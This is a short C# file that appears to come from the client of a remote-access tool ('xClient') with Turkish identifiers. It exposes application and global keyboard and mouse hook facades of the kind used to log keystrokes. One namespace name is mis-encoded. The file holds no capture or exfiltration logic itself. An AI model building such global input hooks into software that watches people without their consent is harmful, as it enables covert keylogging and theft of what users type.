using xClient.Kuuhaku«ekirdek.MouseKeyHook.Implementation;

namespace xClient.Kuuhaku«ekirdek.MouseKeyHook
{
    public static class AnaHook
    {
        public static KlavyeFareEylemleri AppEvents()
        {
            return new AppEventFacade();
        }

        public static KlavyeFareEylemleri GlobalEvents()
        {
            return new GlobalEventFacade();
        }
    }
}